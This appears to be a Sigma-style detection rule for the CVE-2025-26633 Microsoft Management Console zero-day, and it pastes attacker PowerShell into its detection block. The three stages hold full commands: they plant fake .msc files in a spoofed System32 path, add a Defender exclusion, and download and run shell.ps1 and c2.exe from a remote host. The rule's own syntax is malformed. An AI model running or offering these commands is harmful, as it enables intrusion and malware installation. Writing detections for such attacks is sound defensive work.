title: CVE-2025-26633 zero-day vulnerability in the Microsoft Management Console 
id: 20709eb7-b101-46bc-bd9e-af8e095635d1
status: test
description: In this attack the threat actor manipulates.msc files and the Multilingual User Interface Path (MUIPath) to download and execute malicious payload, maintain persistence and steal sensitive data from infected systems.
    - https://www.trendmicro.com/en_in/research/25/c/cve-2025-26633-water-gamayun.html
    - https://www.wiz.io/vulnerability-database/cve/cve-2025-26633
    - https://www.rapid7.com/db/vulnerabilities/microsoft-windows-cve-2025-26633/
    
author: Subhankar H.
date: 2025-06-25
modified: na
tags:
   - CWE-707
logsource:
    product: Microsoft
    category: Bypass
detection:
    selection:
        
        Stage 1 | endswith: 
           $ErrorActionPreference = 'silentlyContinue'

           $htmlLoaderUrl = "http://192.XXX.XXX.115/stage2/"
           $originalConsole = ""
           $hackedConsole = ""
           $fakeFile = ""

           New-Item "\\?\C:\Windows \System32\" -ItemType Directory
           New-Item "\\?\C:\Windows \System32\en-US" -ItemType Directory

           $decodedBytesOriginal = [System.Convert]::FromBase64String($originalConsole)
           $decodedBytesFakes = [System.Convert]::FromBase64String($hackedConsole)

           [System.IO.File]::WriteAllBytes("C:\Windows \System32\WmiMgmt.msc", $decodedBytesOriginal)
           [System.IO.File]::WriteAllBytes("C:\Windows \System32\en-US\WmiMgmt.msc", $decodedBytesFakes)

           (Get-Content -Path '\\?\C:\Windows \System32\en-US\WmiMgmt.msc' -Raw ) -replace '{htmlLoaderUrl}', $htmlLoaderUrl | Set-Content -Path '\\?\C:\Windows \System32\en-US\WmiMgmt.msc'
           if ($fakeFile -ne $null -and $fakeFile -ne "") {
           Start-Process $fakeFile
        }

           Start-Process -FilePath 'C:\Windows \System32\WmiMgmt.msc'
           Start-Sleep -Seconds 30

           Remove-Item -Path "\\?\C:\Windows \System32" -Recurse -Force
           Remove-Item -Path "\\?\C:\Windows \System32\en-US" -Recurse -Force
           Remove-Item -Path "\\?\C:\Windows \" -Recurse -Force
           Exit
 
        stage 2 | endswith:
           external.ExecuteShellCommand("powershell.exe", "", "-ExecutionPolicy Bypass -WindowStyle Hidden -Command & {Add-MpPreference -ExclusionPath $env:TEMP}", "Minimized");
           external.ExecuteShellCommand("powershell.exe", "", "-ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Invoke-RestMethod -Uri 'http://192.XXX.XXX.115/shell.ps1' | Invoke-Expression\"", "Minimized");
           external.ExecuteShellCommand("powershell.exe", "", "-ExecutionPolicy Bypass -WindowStyle Hidden -Command & {taskkill /f /im mmc.exe}", "Minimized");
           external.ExecuteShellCommand("powershell.exe", "", "-ExecutionPolicy Bypass -WindowStyle Hidden -Command & {Start-Process calc.exe}", "Minimized");

        stage 3 | endswith:
           $exePath = "$env:TEMP\c2.exe"
           Invoke-WebRequest -Uri "http://192.XXX.XXX.115/shell.exe" -OutFile $exePath
           Start-Process -FilePath $exePath
               
    condition: selection 
falsepositives:
    - Unknown
level: high